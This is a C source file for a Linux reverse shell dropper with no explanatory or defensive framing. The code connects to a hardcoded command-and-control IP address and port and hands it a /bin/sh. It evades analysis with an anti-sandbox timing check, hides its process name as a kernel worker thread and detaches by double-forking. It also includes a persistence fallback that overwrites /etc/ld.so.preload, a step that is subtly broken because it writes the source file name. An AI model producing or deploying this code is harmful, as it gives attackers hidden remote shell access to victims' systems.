// dropper.c - SleepTheGod @portknock Alpharetta reverse shell loader
// gcc -static -s -O2 -fno-stack-protector -o /tmp/.x11-tmp dropper.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/prctl.h>

#define C2_IP   "173.249.20.58"
#define C2_PORT 4445
#define FAKE    "[kworker/u8:2-flush-8:0]"

static int anti_sandbox(void) {
    if (getppid() == 1) return 1;
    time_t s = time(NULL);
    volatile int x = 0;
    for (int i = 0; i < 100000000; i++) x += i;
    return (time(NULL) - s > 1);
}

int main(void) {
    if (anti_sandbox()) exit(1);

    prctl(PR_SET_NAME, FAKE, 0, 0, 0);

    if (fork()) exit(0);
    setsid();
    if (fork()) exit(0);

    int s = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in a = {
        .sin_family = AF_INET,
        .sin_port   = htons(C2_PORT)
    };
    inet_pton(AF_INET, C2_IP, &a.sin_addr);

    if (connect(s, (struct sockaddr*)&a, sizeof(a)) == 0) {
        dup2(s, 0);
        dup2(s, 1);
        dup2(s, 2);
        char *sh[] = {"/bin/sh", NULL};
        execve(sh[0], sh, NULL);
    }

    // ld.so.preload fallback
    unlink("/etc/ld.so.preload");
    FILE *f = fopen("/etc/ld.so.preload", "w");
    if (f) {
        fprintf(f, "%s\n", __FILE__);
        fclose(f);
    }

    while (1) sleep(666);
    return 0;
}
